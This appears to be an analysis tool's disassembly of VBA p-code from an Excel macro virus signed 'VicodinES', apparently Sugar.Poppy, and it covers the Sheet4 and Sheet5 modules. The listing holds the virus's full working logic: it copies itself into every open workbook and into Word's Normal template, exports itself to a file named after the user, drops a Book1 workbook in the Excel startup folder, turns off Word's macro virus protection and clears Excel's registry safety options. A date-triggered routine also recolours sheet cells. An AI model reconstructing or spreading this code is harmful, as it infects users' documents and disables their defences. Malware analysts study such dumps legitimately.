' 	MemLd CountOfLines 
' 	St WeIn 
' Line #38:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #39:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #42:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #43:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #44:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #45:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0020 "Private Sub Worksheet_Activate()"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #46:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #50:
' 	Ld Weins1 
' 	Paren 
' 	LitDI2 0x0018 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St findvic 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld findvic 
' 	LitStr 0x0009 "VicodinES"
' 	FnInStr3 
' 	LitDI2 0x0002 
' 	Ne 
' 	Ld didvic 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #52:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	LitStr 0x0018 "Private Sub Auto_Close()"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001C "For x = 1 To Workbooks.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0037 "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004D "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001F "If Weins1 > 30 Then OKEY = True"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "Next yz"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "Next x"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0014 "If OKEY <> True Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004E "If UCase(Dir("c:\" & Application.UserName)) = UCase(Application.UserName) Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x007A "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromFile "c:\" & Application.UserName"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0062 "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.DeleteLines 1, 4"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0004 "Else"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004C "MsgBox "Why Did You Remove Sugar.Poppy?", vbQuestion, "VicodinES wonders...""
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x000A "'VicodinES"
' 	Concat 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #53:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #54:
' 	ElseBlock 
' Line #55:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #60:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #61:
' 	ArgsCall (Call) AbuseWord 0x0000 
' Line #62:
' 	LitVarSpecial (True)
' 	ParamNamed SaveChanges 
' 	LitStr 0x0006 "Book1."
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Private Sub AbuseWord())
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set WordObj 
' Line #68:
' 	Ld WordObj 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #69:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set WordObj 
' Line #70:
' 	LitVarSpecial (True)
' 	St Quit 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld WordObj 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #73:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0004 "'Vic"
' 	FnInStr3 
' 	IfBlock 
' Line #74:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #75:
' 	ElseBlock 
' Line #76:
' 	LitVarSpecial (False)
' 	Ld WordObj 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #77:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #78:
' 	LitDI2 0x0001 
' 	LitStr 0x0013 "Sub AutoExec() 'Vic"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #79:
' 	LitDI2 0x0002 
' 	LitStr 0x0043 "System.ProfileString("Options", "EnableMacroVirusProtection") = "0""
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #80:
' 	LitDI2 0x0003 
' 	LitStr 0x0079 "System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #81:
' 	LitDI2 0x0004 
' 	LitStr 0x008C "System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #82:
' 	LitDI2 0x0005 
' 	LitStr 0x0007 "End Sub"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #83:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	SetStmt 
' 	LitNothing 
' 	Set NT 
' Line #86:
' 	Ld Quit 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld WordObj 
' 	ArgsMemCall Quit 0x0000 
' 	EndIf 
' Line #87:
' 	EndSub 
' _VBA_PROJECT_CUR/VBA/Sheet4 - 7938 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn run1
' 	VarDefn didvic (As Boolean)
' Line #1:
' 	FuncDefn (Private Sub Worksheet_Activate())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	ArgsCall Read 0x0000 
' Line #4:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #5:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #6:
' 	LitDI2 0x0040 
' 	Ld y 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld x 
' 	Concat 
' 	St rng 
' Line #7:
' 	Ld rng 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #8:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Interior 
' 	With 
' Line #9:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	MemStWith ColorIndex 
' Line #10:
' 	Ld xlSolid 
' 	MemStWith Pattern 
' Line #11:
' 	EndWith 
' Line #12:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Application 
' 	MemLd UserName 
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #15:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld vbCr 
' 	St v1 
' Line #18:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #19:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #20:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld WeIn 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #21:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #22:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #23:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #24:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #25:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld Weins1 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #26:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' 	Label out 
' Line #31:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "Book1"
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St PXLS 
' 	EndIf 
' Line #32:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld run1 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #33:
' 	LitVarSpecial (True)
' 	St run1 
' Line #34:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #37:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #38:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #39:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #42:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #43:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #44:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #45:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0020 "Private Sub Worksheet_Activate()"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #46:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #50:
' 	Ld Weins1 
' 	Paren 
' 	LitDI2 0x0018 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St findvic 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld findvic 
' 	LitStr 0x0009 "VicodinES"
' 	FnInStr3 
' 	LitDI2 0x0002 
' 	Ne 
' 	Ld didvic 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #52:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	LitStr 0x0018 "Private Sub Auto_Close()"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001C "For x = 1 To Workbooks.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0037 "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004D "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001F "If Weins1 > 30 Then OKEY = True"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "Next yz"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "Next x"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0014 "If OKEY <> True Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004E "If UCase(Dir("c:\" & Application.UserName)) = UCase(Application.UserName) Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x007A "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromFile "c:\" & Application.UserName"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0062 "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.DeleteLines 1, 4"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0004 "Else"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004C "MsgBox "Why Did You Remove Sugar.Poppy?", vbQuestion, "VicodinES wonders...""
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x000A "'VicodinES"
' 	Concat 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #53:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #54:
' 	ElseBlock 
' Line #55:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #60:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #61:
' 	ArgsCall (Call) AbuseWord 0x0000 
' Line #62:
' 	LitVarSpecial (True)
' 	ParamNamed SaveChanges 
' 	LitStr 0x0006 "Book1."
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Private Sub AbuseWord())
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set WordObj 
' Line #68:
' 	Ld WordObj 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #69:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set WordObj 
' Line #70:
' 	LitVarSpecial (True)
' 	St Quit 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld WordObj 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #73:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0004 "'Vic"
' 	FnInStr3 
' 	IfBlock 
' Line #74:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #75:
' 	ElseBlock 
' Line #76:
' 	LitVarSpecial (False)
' 	Ld WordObj 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #77:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #78:
' 	LitDI2 0x0001 
' 	LitStr 0x0013 "Sub AutoExec() 'Vic"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #79:
' 	LitDI2 0x0002 
' 	LitStr 0x0043 "System.ProfileString("Options", "EnableMacroVirusProtection") = "0""
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #80:
' 	LitDI2 0x0003 
' 	LitStr 0x0079 "System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #81:
' 	LitDI2 0x0004 
' 	LitStr 0x008C "System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #82:
' 	LitDI2 0x0005 
' 	LitStr 0x0007 "End Sub"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #83:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	SetStmt 
' 	LitNothing 
' 	Set NT 
' Line #86:
' 	Ld Quit 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld WordObj 
' 	ArgsMemCall Quit 0x0000 
' 	EndIf 
' Line #87:
' 	EndSub 
' _VBA_PROJECT_CUR/VBA/Sheet5 - 7938 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn run1
' 	VarDefn didvic (As Boolean)
' Line #1:
' 	FuncDefn (Private Sub Worksheet_Activate())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	ArgsCall Read 0x0000 
' Line #4:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #5:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #6:
' 	LitDI2 0x0040 
' 	Ld y 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld x 
' 	Concat 
' 	St rng 
' Line #7:
' 	Ld rng 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #8:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Interior 
' 	With 
' Line #9:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	MemStWith ColorIndex 
' Line #10:
' 	Ld xlSolid 
' 	MemStWith Pattern 
' Line #11:
' 	EndWith 
' Line #12:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Application 
' 	MemLd UserName 
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #15:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld vbCr 
' 	St v1 
' Line #18:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #19:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #20:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
